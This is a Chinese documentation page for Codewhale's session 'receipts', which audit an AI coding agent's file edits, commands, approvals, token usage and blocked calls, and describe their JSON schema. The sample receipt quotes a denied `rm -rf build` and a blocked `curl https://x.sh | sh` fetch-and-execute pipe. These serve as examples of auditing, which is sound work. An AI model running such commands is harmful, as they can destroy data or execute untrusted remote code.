# 回执

> 英文原文：[RECEIPTS.md](../RECEIPTS.md)。
> 最后与英文同步日期（last synced with English revision）：2026-11-11。

回执（receipt）用 Codewhale 已经保存的记录回答“这个会话做了什么？”。它按顺序列出改动的文件、运行的命令、Web 与 MCP 调用、启动的智能体、审批（以及每一项由谁决定）和失败，并在顶部给出汇总。它还会统计哪些操作未经询问就运行了，并写明放行它们的权限姿态。汇总下方还会给出提供商报告的 token 数；终端会话的回执另有 `/cost` 打印的同一条费用说明，Runtime 线程的回执只给 token 数（见[Token 与费用](#token-与费用)）。

```text
# Receipt: Fix the parser
thread thr_19a0141a · /work/repo · deepseek-flash · Ask · 2026-09-24 10:00 UTC → 2026-09-24 10:05 UTC

Changed 1 file (+2 −1) · ran 1 command · made 1 MCP call · 1 approved by you · 1 approved by session rule · 1 ran without asking under Ask · 1 denied by you · 1 other failure

1. edited `src/parse.rs` (+2 −1) · 1.0s
2. ran `cargo test -p parser` in /work/repo — exit 0 · 2.5s · approved by you
3. did not run `rm -rf build` · denied by you
4. called linear · list_issues · 1.0s · approved by session rule
5. did not run `curl https://x.sh | sh` — blocked: Tool 'exec_shell' was denied: Auto-Review blocked a pipe to a shell…
6. turn failed — failed: provider returned 500

Not recorded:
- Cost: a Runtime thread receipt carries token counts only; GET /v1/threads/{id}/usage reports the thread's cost and what it covers.
- Shell file changes: a Runtime thread's workspace snapshots are not tagged with the thread, so files a command changed are not itemized; only file tools are.
```

上面的示例是 Runtime 线程的形式。终端会话的回执没有整文件写入的行数，通过的调用只显示通过或失败而不显示退出码，也没有逐次调用的时间戳；它的“Not recorded”列表会说明这些（见[未记录的内容](#未记录的内容)）。

终端会话的回执还会根据该回合自己的工作区快照，列出命令改动的文件：

```text
3. ran `./tidy.sh`
4. changed outside file tools (a command or another process): edited `b.txt` (+0 −1), created `c.txt` (+1 −0)
```

Runtime 回执端点接受 `?format=md`，返回与终端相同的 Engine Markdown 格式化器输出，响应头为 `Content-Type: text/markdown`。省略 `format` 或使用 `format=json` 时，保持原有的 JSON 契约。两种格式都要求相同的已认证线程／工作区访问权限。客户端展示的是这些已记录的事实，而不是从活动标签推导审计汇总。

## 入口

三个入口共用同一个构建器（`crates/engine/src/receipts.rs`），但读取的记录不同，覆盖范围也可能不同。

| 入口 | 读取的内容 |
| --- | --- |
| 终端中的 `/receipts [json] [<turn>]` | 当前会话的对话记录、审批日志和保留下来的终态失败记录。`json` 会把对象打印在代码块中，复制出来就是合法的 JSON |
| `codewhale receipts [ID\|--last] [--turn T] [--format md\|json]` | 一个已保存的会话（id 或唯一前缀，包括它保留的终态失败记录），或一个 Runtime 线程（`thr_…`）；不给 id 时读取最近更新的那一个。`receipt` 是别名 |
| `GET /v1/threads/{id}/receipt`、`GET /v1/threads/{id}/turns/{turn_id}/receipt` | 一个 Runtime 线程（app、`codewhale serve`），位于常规 `/v1` bearer 认证边界之后 |

三者都只读。它们从不调用提供商、运行工具、写文件或改变运行时状态。

提供工具的 exec 运行（包括 `exec --auto`）在任何输出格式下都会保存会话，所以结束后可以用 `codewhale receipts --last` 读取它们的回执。恢复的会话和 `--output-format stream-json` 运行也会保存。其他只输出回答的文本运行和 `--json` 运行，只有在开始对话压缩时才会保存；如果想始终保留会话，请使用 `--output-format stream-json`。

`codewhale receipts` 从本机的默认存储（`tasks/runtime/` 或 `$CODEWHALE_RUNTIME_DIR`）读取 Runtime 线程。保存在某个终端会话自己的存储（`sessions/<id>/runtime/`）中的线程无法按 id 找到；API 读取的是它所在服务器拥有的存储。

## 事实从哪里来

| 会话类型 | 记录 | 内容 |
| --- | --- | --- |
| 终端会话 | `sessions/<id>.json` | 按顺序保存每次工具调用及其结果文本；每条提示的 `<turn_meta>` 写明该回合运行时的权限姿态；`turn_outcomes` 记录回合的终态和错误 |
| 终端会话 | `sessions/<id>/approval_receipts.jsonl` | 每一次审批请求与决定，附带时间和决定者 |
| Runtime 线程 | `tasks/runtime/turns`、`items` | 每次工具调用的输入、状态、开始与结束时间，以及结构化结果（退出码、diff、智能体状态）；每个回合的 `permission_posture` |
| Runtime 线程 | `tasks/runtime/events/<thread>.jsonl` | `approval.required` / `approval.decided`，以及说明由谁决定的标志 |

已保存会话的 CLI 和实时的 `/receipts` 会把回合的终态失败（包括 exec 运行中的模型错误）读作 `turn_failed` 动作，即使没有工具失败，也计入失败数。截断对话会删除保留历史之外的结果，所以后续回合不会继承这些失败。已保存的会话只保留最新的 64 条失败回合记录。更早的结果，以及没有这项记录的旧会话，无法仅凭工具结果给出完整的终态失败历史。

### 谁做出了审批决定

| 回执中的写法 | 含义 | 记录形式 |
| --- | --- | --- |
| approved by you / denied by you | 由人作答：终端卡片、app、网页镜像，或代表你操作的 API 客户端 | `decided_by: "user"`；Runtime 事件不带 `auto` 标志 |
| … by session rule | 由一条记住的“本次会话”规则作答 | `decided_by: "session_rule"`；Runtime 事件带 `auto` 和 `grant_id` |
| … by posture | 由模式或权限姿态直接作答，没有弹出提示 | `decided_by: "posture"`；Runtime 事件带 `auto` 或 `posture` |
| approval timed out | 卡片无人应答而过期 | 结果为 `timeout` |
| turn stopped while waiting / nobody could be asked | Codewhale 无人可问：回合已经结束或停止，或者请求始终没有送达任何人。计为未应答，绝不计为拒绝，即使记录写的是 `denied` | `decided_by: "host"` |
| approved / denied，没有“by” | 0.10.1 之前写入的记录，或子智能体的请求。汇总行会写“(decider not recorded)” | 没有 `decided_by` |

汇总行按决定者分别统计批准和拒绝：`1 approved by you · 1 denied by you` 是两次决定。

### 未经询问即运行

大多数调用从不产生审批。Full Access 下什么都不问；Ask 下，读取操作和已允许的工具无需提示即可运行，一条记住的规则也可以省掉一次提示。这些调用不留下审批记录，所以由回执来统计它们：`ran_without_asking` 指所有在没有审批记录的情况下运行的文件改动、命令、代码运行、Web 或 MCP 调用以及智能体启动。汇总行会写明这些回合运行时的权限姿态（`9 ran without asking under Full Access`）。读取操作不计入，没有启动的调用也不计入（见下文）。

### 运行前被拦截

对于它拒绝运行的调用，Codewhale 会返回一条错误结果，方式与工具报告失败相同：Auto-Review 或 guardian 拦截、工具策略或允许列表拒绝、当前权限姿态无法授予的沙箱提权、无法解析的输入，或不可用的工具。这些情况都不会写入审批，所以回执读取的是结果本身：

- **被拦截：** 结果是 Codewhale 自己的拒绝文本（`Tool 'x' was denied: …`、`Invalid input for tool …`、`BLOCKED: …`、带有 `"side_effect_status":"not_started"` 的校验反馈行，或 Runtime 线程的 `Failed to authorize tool execution: …`）。列为 `did not run … — blocked: <reason>`，状态为 `blocked`，计入 `blocked`（汇总行中的 `N blocked before running`），绝不计为已运行、失败或未经询问即运行。引擎写出的每条权限拒绝都以 `Tool 'x' was denied:` 开头，包括那些自带解决办法的拒绝（Plan 模式、`allow_shell`）；0.10.1 之前保存的会话写出其中一些拒绝时没有这个开头，这样的调用会被读作失败。
- **只认 Codewhale 自己的话。** MCP 服务器或 GitHub 的回复、抓取的网页、程序的输出（代码工具）以及子智能体的话可能写任何内容，所以对这些来源的失败调用，只按 Codewhale 为它写下的元数据判断，绝不看其文本：一个回答 `BLOCKED: …` 或 `{"side_effect_status":"not_started"}` 的 MCP 服务器，会被列为一次已运行但失败的调用。`BLOCKED:` 只在来自 shell 工具时才算数，校验反馈行也只在它是结果的最后一行时才算数。
- **停在审批提示、但没有审批记录**（子智能体，或早于审批日志的会话）：结果写的是 `Tool 'x' denied by user`，而引擎在无人可问时也会写这句话。列为 `did not run …`，不写决定者，因为这段文本无法证明是谁说了不。
- **运行后失败：** 结果中有退出码，或有 shell 只会在进程运行之后才写出的行（`Command exited with code N`、`Command failed (exit code N)`、超时或取消行）。计为一条命令和一次失败。
- **两者都看不出：** 命令的错误中两样都没有。列为 `tried to run … — error, no exit code: <error>`，状态为 `unknown`，不计为已运行，并附一条 `not_recorded` 说明。其他返回错误的工具计为失败，因为错误来自工具本身。

0.9.10（2026-08-20）之前开始的终端会话没有审批日志，所以它们的回执不统计这一项，并会说明原因。

### Token 与费用

终端会话的回执会为整个会话提供 `usage` 部分：

```text
Tokens: 1200 in · 90 out · 1290 total · 2 provider calls (800 cache read)
Cost, as /cost reports it:
  Session Cost:
  ─────────────────────────────
  Estimated total: unknown
  No turn has an authoritative price in the selected currency.
  This is an estimate, not a bill: it is computed locally from provider-reported token usage and published rates, and can differ from your invoice.
  Covered: 0 of 2 money-metered turn(s) priced.
  Excluded: 2 money-metered turn(s) had no authoritative price (billing basis unknown); their spend is missing from the total above.
```

JSON 中同一部分是 `usage`，费用是一个对象：

```json
"usage": {
  "tokens": { "input": 1200, "output": 90, "total": 1290, "cache_read": 800, "calls": 2 },
  "cost": {
    "state": "unknown", "currency": "USD",
    "priced_turns": 0, "unpriced_turns": 2,
    "report": "Session Cost: …"
  }
}
```

- **Token 数**是提供商报告的数值，对会话已记录的各次提供商调用（父回合和子智能体）求和。如果会话只保存了合计，回执只显示该合计；如果什么都没保存，回执会明说：这不等于零用量。
- **费用**是 `/cost` 打印的报告，由同一个格式化器、依据同一份已保存的覆盖信息生成，措辞与数字不会漂移。当路线没有已知价格时，回执写明“unknown”及原因，绝不估算。JSON 中的 `usage.cost.state` 为 `priced`、`partial`（小计：部分回合没有价格）或 `unknown`；只有至少一个回合有价格时才会有 `amount`。
- 针对单个回合的回执（`/receipts 2`、`--turn 2`）会省略 `usage` 并说明原因，因为 token 与费用是按整个会话保存的。
- Runtime 线程的回执只带有来自其回合记录的 token 数，不含费用；`GET /v1/threads/{id}/usage` 会报告线程的费用及其覆盖范围。
- `codewhale metrics` 会在单独一行统计已保存终端会话中的同类用量，与 Runtime 的 `turn.usage` 事件分开，因为会话范围的 Runtime 存储可能从自己的一侧描述同一次调用。

0.10.3 之前的构建写出的回执没有 `usage` 部分；读取方应把该字段视为可选。

### 未记录的内容

回执会如实说明，而不是猜测：

- **Runtime 线程中 shell 的文件改动。** 终端会话根据 Codewhale 在每个回合前后拍下的工作区快照（在快照侧仓库内对两次快照做 `git diff`；每个回合最多 50 个路径）读取命令改动的文件。Runtime 线程的快照没有标记所属线程，所以它的回执只列出文件工具的改动。没有快照对的终端回合（快照已关闭、工作区太大无法快照，或快照已被清理：只保留最新的 50 个）会说明这一点。快照差异涵盖回合期间写入工作区的一切，包括你或其他程序，而不只是这条命令。它不包含快照不跟踪的内容：被忽略和跳过的路径（`.gitignore` 条目、`.env`、`node_modules`、`target` 等），以及工作区之外的任何内容（`~/.ssh`、`/tmp`），所以列表为空并不代表命令什么都没写。回合按提示与快照匹配；当另一个回合的提示相同（例如“continue”）时，快照的回合编号也必须一致，否则该回合计为没有快照对，而不会拿到另一个回合的文件。路径打印时会转义控制字符（`\n`、`\u{1b}`），所以文件名无法在回执中多加一行，也无法向终端发送转义序列。
- **终端会话的退出码、耗时和时间戳。** 终端会话保存的是每次调用及其结果文本，而不是结构化结果。失败的 shell 调用的退出码，从 shell 工具自己的结尾行（`Command exited with code N`）读取；成功的调用不显示退出码。
- 终端会话中**整文件写入的行数**，以及文件此前是否存在。
- 0.10.1 之前记录的审批和子智能体审批的**决定者**。
- 0.9.10 之前开始的终端会话中，**哪些调用先询问过**。
- 当错误中既没有退出码也没有 shell 状态行时，**失败的命令是否启动过**；以及没有结果的调用到底是否运行过。
- 除回合的权限姿态之外，**调用为什么未经询问就运行**：记录不说明放行它的是权限姿态、允许规则，还是一项记住的授权。

## 非目标

回执不是安全认证、提供商兼容性认证，也不是托管证明（JSON 中的 `claim_ceiling` 会说明这一点）。它不导出推理文本，也不导出原始工具输出。命令、搜索查询和错误行都有长度上限（分别为 200、120 和 160 个字符），并经过共享的密钥脱敏器处理。一份回执最多列出 2,000 个动作；汇总始终覆盖全部动作，其余部分由 `omitted_actions` 计数。

## JSON 结构

`--format json`、`/receipts json` 和 API 返回同一个对象：

```json
{
  "schema_id": "codewhale.receipt/v1",
  "source": {
    "kind": "thread",
    "id": "thr_19a0141a",
    "title": "Fix the parser",
    "workspace": "/work/repo",
    "model": "deepseek-flash",
    "started_at": "2026-09-24T10:00:00Z",
    "updated_at": "2026-09-24T10:05:00Z"
  },
  "postures": ["Ask"],
  "totals": {
    "files_changed": 1, "files_changed_outside_file_tools": 0,
    "files_created": 0, "files_deleted": 0,
    "lines_added": 2, "lines_removed": 1, "line_counts_complete": true,
    "commands": 1, "commands_failed": 0, "code_runs": 0, "network": 0,
    "mcp_calls": 1, "plugin_calls": 0, "subagents": 0,
    "approvals": {
      "total": 3, "approved": 2, "denied": 1, "timed_out": 0,
      "not_answered": 0, "pending": 0,
      "approved_by": { "you": 1, "session_rule": 1, "posture": 0, "not_recorded": 0 },
      "denied_by": { "you": 1, "session_rule": 0, "posture": 0, "not_recorded": 0 }
    },
    "ran_without_asking": 1, "failures": 1, "blocked": 1,
    "other_tool_calls": 0
  },
  "usage": {
    "tokens": { "input": 1200, "output": 90, "total": 1290, "cache_read": 800 }
  },
  "actions": [
    {
      "seq": 2, "turn": "turn_1", "at": "2026-09-24T10:02:00Z",
      "call_id": "call_test", "tool": "exec_shell",
      "kind": "command", "command": "cargo test -p parser",
      "cwd": "/work/repo", "exit_code": 0,
      "status": "ok", "duration_ms": 2500,
      "approval": {
        "decision": "approved", "decided_by": "user",
        "at": "2026-09-24T10:01:59Z"
      }
    }
  ],
  "omitted_actions": 0,
  "not_recorded": ["Cost: …", "Shell file changes: …"],
  "claim_ceiling": [
    "local_record_only",
    "not_safety_certification",
    "not_provider_compatibility_certification"
  ]
}
```

`kind` 取以下值之一：`file_change`（`files[]`，含 `path`、`change` = `edited|created|deleted|written`，以及可选的 `lines_added`/`lines_removed`）、`workspace_change`（`files[]` 为某回合快照显示有改动、但没有任何文件工具提到的文件；超过 50 个时带 `truncated`）、`command`（`command`、`cwd`、`exit_code`）、`code`（`exit_code`，以及 `nested[]`：`execute_tools` 程序发起的工具调用）、`network`（`action`、`host`、`query`）、`mcp`（`server`、`plugin`）、`subagent`（`name`、`agent_id`、`outcome`）、`approval`（没有对应调用的审批）、`tool`（其他任何调用，仅在失败时列出），或 `turn_failed`。`status` 取值为 `ok`、`failed`（运行后失败）、`not_run`（停在审批处）、`blocked`（启动前被拒绝；原因在 `error` 中）、`interrupted`、`running` 或 `unknown`（没有结果，或命令错误无法表明它是否启动过）。终端会话的 `turn` 是回合编号；线程的 `turn` 是回合 id。对会话中不存在的回合使用 `/receipts 7` 或 `--turn 7` 会报错，而不是返回一份空回执。

## `audit.log` 不是回执

`~/.codewhale/audit.log` 是安全事件日志：凭据的保存与清除、钩子环境变量的键名、压缩过程、目标完成、终端自身的审批路由、Auto-Review 裁决（`tool.gate.decision`，自 0.10.1 起），以及开启 `[network]` 审计时的出站网络决定。它从未保存过命令或文件改动，app 或 `codewhale serve` 运行的回合也不会在这里写入审批。这些回合的审批在会话的 `approval_receipts.jsonl` 和线程的事件日志中，回执正是从那里读取它们。

`audit.log` 安静并不代表什么都没运行。只有当终端路由一条审批请求时，它才会写入一行审批记录。自 0.8.66（`1c68e3bb32`，2026-06-29）起，引擎自己决定自动放行的调用，所以它们根本不会变成请求；Full Access 下几乎没有调用会变成请求。在一台开发者机器上，最后一行 `tool.approval.*` 写于 2026-08-19，最后一行 `tool.approval.auto_approve` 写于 2026-06-30，此后的写入都来自测试运行，而自 `244368675b` 起测试运行写入的是一个临时日志。要查看运行了什么，请使用回执。

## 审查回执

`codewhale review --write-receipt` 会为被审查的 diff 写一份本地 JSON 回执，默认存放在 Codewhale 状态目录下（`review-receipts/`），提供 `--receipt-path <path>` 时则写到指定路径。这是一份推送前的交接产物：它记录审查了哪个 diff、审查报告了什么，但不会推送、打标签、开 PR，也不声称可以取代维护者审查。

当前的回执包括：

- `diff_fingerprint`：被审查 diff 的 SHA-256。
- `provider` 和 `model`：路由到的审查提供商／模型。
- `checks_run`：可用时附加到回执上的本地检查。为空表示没有附加检查；附加的检查必须报告通过状态。
- `findings`：当审查输出是结构化的时，给出结构化的问题／建议计数和问题位置。
- `unresolved_risk`：从未解决的发现中推导出的保守摘要。
- `review_content_sha256`：审查文本的 SHA-256。
- `coverage`（PR 回执）：确切的 base/head 和完整 diff 指纹、按顺序排列的每轮 diff 指纹／文件数，以及每个已完成轮次的一个响应内容哈希。基于清单（manifest）的 PR 回执使用 schema 版本 2，这样旧的读取方会直接拒绝，而不是误读它们。

回执刻意不包含原始 diff 内容。改动 diff 之后，请重新运行 `codewhale review --write-receipt`；审查者在 PR 交接中复用回执之前，应先比对 `diff_fingerprint`。

`codewhale review --check-receipt` 是本地的推送前关卡。它不调用模型；它把当前 diff 指纹与提供的回执（`--receipt-path <path>`）或最新匹配的本地回执进行比较。当 diff 不再匹配、回执 schema 不受支持、回执存在未解决的风险，或某项附加检查未通过时，检查以非零状态退出。

默认情况下，如果一个 PR 需要不止一轮 `--max-chars`，回执生成会在调用模型之前拒绝它。显式指定 `--max-passes N` 时，最多接受 N 个完整且有序的 PR 轮次；任何缺失、格式错误、顺序错乱或过期的轮次都会阻止生成回执。回执检查不需要提供商，它校验存储的确切清单，而不授权再次运行。两种模式都不会对截断后的前缀做指纹。`review --base <base-sha> --path <path>` 的回执只覆盖已检出版本中选定的那个路径；校验时请使用相同的 base、路径和输入上限。它不覆盖拉取请求的其余部分，也不能证明分别审查的改动能够协同工作。使用 `--base` 时，审查者还会读取 `base..HEAD` 的提交信息（不含合并提交，上限 16,000 个字符），作为作者陈述的意图；回执对 diff 做指纹，而不对这些提交信息做指纹。

## 构建器规则

构建器是确定性且保守的：

1. 线程回执会加载线程、它的回合、每个回合列出的条目（对于正在进行的回合，还包括指向该回合但尚未列出的条目），以及该线程的 `approval.*` 事件。来自其他线程的回合 id 会被拒绝。
2. 会话回执从对话记录中读取 `tool_use`/`tool_result` 对，并重放审批日志；无法重放的日志会被报告出来，而不是只用一半。
3. 审批按工具调用 id 关联到对应的调用。没有对应调用的审批单独列出。
4. 如果保存了工具的结构化变更记录（实际应用的 diff），文件改动就取自这份记录；否则取自调用本身的输入（编辑的替换文本、补丁的 hunk）。失败的调用没有改动任何内容，也不带计数。
5. 不从模型的文字中推导任何内容。只读取 Codewhale 自己写出的两类固定文本：shell 的状态行（用于获取退出码）和它的拒绝文本（用于识别被它拦截的调用）；见“运行前被拦截”。
